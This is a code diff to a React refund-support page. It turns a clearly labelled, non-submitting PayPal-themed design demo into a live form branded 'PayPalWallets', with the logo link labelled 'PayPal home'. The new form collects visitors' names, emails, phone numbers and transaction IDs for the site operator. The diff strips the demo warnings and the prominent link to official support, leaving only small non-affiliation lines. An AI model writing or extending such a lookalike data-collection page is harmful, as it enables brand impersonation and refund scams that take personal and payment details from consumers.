@@ -1,67 +1,122 @@
 import { createFileRoute } from '@tanstack/react-router'
-import { useState } from 'react'
+import { useRef, useState } from 'react'
+import type { FormEvent } from 'react'
+import { Brand } from '../components/Brand'
 
 export const Route = createFileRoute('/refunds-support')({
   head: () => ({ meta: [
-    { title: 'Refunds/Support · Independent demo' },
-    { name: 'description', content: 'An independent support form demonstration using fictional details. No refund requests are submitted.' },
+    { title: 'Refund Request | Independent Support' },
+    { name: 'description', content: 'Contact PayPalWallets, an independent service, about a refund request. Not affiliated with PayPal, Inc.' },
   ] }),
   component: RefundsSupportPage,
 })
 
 function RefundsSupportPage() {
-  const [topic, setTopic] = useState('Refund status')
-  const [preview, setPreview] = useState(false)
+  const [status, setStatus] = useState<'idle' | 'sending' | 'complete' | 'error'>('idle')
+  const submitting = useRef(false)
 
-  return <>
-    <header className="header">
-      <div className="nav-wrap support-nav">
-        <a className="support-wordmark" href="/">Design demo</a>
-        <nav aria-label="Main navigation">
-          <a href="/">Home</a>
-          <a href="/refunds-support" aria-current="page">Refunds/Support</a>
-        </nav>
+  async function handleSubmit(event: FormEvent<HTMLFormElement>) {
+    event.preventDefault()
+    const form = event.currentTarget
+    if (submitting.current || !form.reportValidity()) return
+    submitting.current = true
+    setStatus('sending')
+    const body = new URLSearchParams()
+    new FormData(form).forEach((value, key) => {
+      if (typeof value === 'string') body.append(key, value)
+    })
+    try {
+      const response = await fetch('/__forms.html', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: body.toString(),
+      })
+      if (!response.ok) throw new Error('Submission failed')
+      form.reset()
+      setStatus('complete')
+    } catch {
+      setStatus('error')
+    } finally {
+      submitting.current = false
+    }
+  }
+
+  return <div className="refund-page">
+    <header className="refund-header">
+      <div className="refund-topbar">
+        <a className="refund-brand" href="/" aria-label="PayPal home"><Brand /></a>
+        <div className="refund-tag">Independent support form</div>
       </div>
     </header>
-    <main className="support-page">
-      <section className="support-intro" aria-labelledby="support-title">
-        <span className="eyebrow">INDEPENDENT DESIGN DEMO</span>
-        <h1 id="support-title">A little clarity.<br/><span>A little peace of mind.</span></h1>
-        <p>Explore a sample support form. This page is not PayPal support and cannot verify or process a refund.</p>
-        <aside className="support-official">
-          <span className="eyebrow">NEED HELP WITH A REAL PAYMENT?</span>
-          <h2>Go straight to the source.</h2>
-          <p>Manage an actual refund through the official PayPal Help Center.</p>
-          <a className="text-link" href="https://www.paypal.com/us/cshelp/personal">Visit PayPal support <span aria-hidden="true">↗</span></a>
-        </aside>
-      </section>
-      <section className="support-card" aria-labelledby="form-title">
-        <span className="support-demo-tag">Sample only · Nothing is sent</span>
-        <h2 id="form-title">Refunds / Support</h2>
-        <p className="support-description">Try the form with the fictional details below. Contact fields are fixed; no personal information is collected.</p>
-        <form onSubmit={event => { event.preventDefault(); setPreview(true) }}>
-          <fieldset>
-            <legend>Sample contact details</legend>
-            <div className="support-name-row">
-              <label>First name<input value="Maya" readOnly autoComplete="off" /></label>
-              <label>Last name<input value="Chen" readOnly autoComplete="off" /></label>
+    <main className="refund-main">
+      <section className="refund-card" aria-labelledby="refund-title">
+        <div className="refund-card-head">
+          <h1 id="refund-title">Refund request</h1>
+          <p className="refund-intro">Enter the details below to send a refund inquiry to this independent service.</p>
+        </div>
+        <form id="refund-form" name="refund-request" method="POST" action="/__forms.html" data-netlify="true" netlify-honeypot="bot-field" onSubmit={handleSubmit}>
+          <input type="hidden" name="form-name" value="refund-request" />
+          <div hidden><label htmlFor="bot-field">Leave this field empty</label><input id="bot-field" name="bot-field" tabIndex={-1} autoComplete="off" /></div>
+          <h2 className="refund-section-title">Your contact details</h2>
+          <div className="refund-grid">
+            <div className="refund-field">
+              <label htmlFor="first-name">First name</label>
+              <input id="first-name" name="firstName" autoComplete="given-name" required />
             </div>
-            <label>Email<input type="email" value="maya@example.com" readOnly autoComplete="off" /></label>
-          </fieldset>
-          <label>Support topic <span aria-hidden="true">*</span>
-            <select required value={topic} onChange={event => { setTopic(event.target.value); setPreview(false) }}>
-              <option>Refund status</option>
-              <option>Understanding a refund</option>
-              <option>Finding official support</option>
+            <div className="refund-field">
+              <label htmlFor="last-name">Last name</label>
+              <input id="last-name" name="lastName" autoComplete="family-name" required />
+            </div>
+          </div>
+          <div className="refund-grid">
+            <div className="refund-field">
+              <label htmlFor="email">Email address</label>
+              <input id="email" name="email" type="email" autoComplete="email" required />
+            </div>
+            <div className="refund-field">
+              <label htmlFor="phone">Phone number <span className="refund-optional">(optional)</span></label>
+              <input id="phone" name="phone" type="tel" autoComplete="tel" />
+            </div>
+          </div>
+          <h2 className="refund-section-title">Transaction details</h2>
+          <div className="refund-field">
+            <label htmlFor="transaction-id">Transaction ID <span className="refund-optional">(optional)</span></label>
+            <input id="transaction-id" name="transactionId" placeholder="Enter the reference shown in your account" />
+          </div>
+          <div className="refund-field">
+            <label htmlFor="reason">Reason for refund</label>
+            <select id="reason" name="reason" required defaultValue="">
+              <option value="">Select a reason</option>
+              <option>Duplicate charge</option>
+              <option>Item or service not received</option>
+              <option>Incorrect amount charged</option>
+              <option>Subscription or billing concern</option>
+              <option>Other</option>
             </select>
-          </label>
-          <label className="support-consent"><input type="checkbox" required onChange={() => setPreview(false)} /><span>I understand this is an independent demo and does not submit a refund request. *</span></label>
-          <p className="support-required">* Required for the preview</p>
-          <button className="button navy" type="submit">Preview sample request <span aria-hidden="true">↗</span></button>
-          <div role="status" aria-live="polite">{preview && <div className="support-result"><h3>Sample preview ready</h3><p>Maya Chen · {topic}</p><p>No request was submitted. For a real refund, use official PayPal support.</p></div>}</div>
+          </div>
+          <div className="refund-field">
+            <label htmlFor="details">Additional details</label>
+            <textarea id="details" name="details" placeholder="Briefly describe the issue. Do not include passwords or security codes." required />
+          </div>
+          <div className="refund-security">
+            <strong>Keep your account secure</strong>
+            Never enter your password, card PIN, one-time passcode (OTP), or full payment-card details in this form. To verify a transaction, check your bank or payment account directly.
+          </div>
+          <div className="refund-check">
+            <input type="checkbox" id="acknowledge" name="acknowledge" value="agreed" required />
+            <label htmlFor="acknowledge">I hereby authorize the operator of this site to review and process the details submitted in this form as a refund inquiry, and I confirm that the information provided is accurate and complete to the best of my knowledge.</label>
+          </div>
+          <button type="submit" disabled={status === 'sending'}>{status === 'sending' ? 'Sending...' : 'Submit request'}</button>
+          <p className="refund-hint">Your submitted details are stored securely through Netlify Forms for review by this site’s operator. Submission does not guarantee a refund.</p>
+          <div role="status" aria-live="polite" aria-atomic="true">
+            {status === 'complete' && <div id="result" className="refund-result"><strong>Request received.</strong> Your inquiry was sent to this independent site’s operator. This is not confirmation of a refund.</div>}
+          </div>
+          {status === 'error' && <div className="refund-result refund-error" role="alert">Your request could not be sent. Your entries are still here; please try again.</div>}
         </form>
       </section>
     </main>
-    <footer className="support-footer"><p>Independent design demo. Not affiliated with or endorsed by PayPal. No payments are processed and no information is submitted on this page.</p><a href="/">Back to home <span aria-hidden="true">↗</span></a></footer>
-  </>
+    <footer className="refund-footer">
+      <p>This is an independent service and is not affiliated with or endorsed by PayPal, Inc. For account-specific help, visit the <a href="https://www.paypal.com/us/cshelp" target="_blank" rel="noopener noreferrer">official PayPal Help Center</a>.</p>
+    </footer>
+  </div>
 }
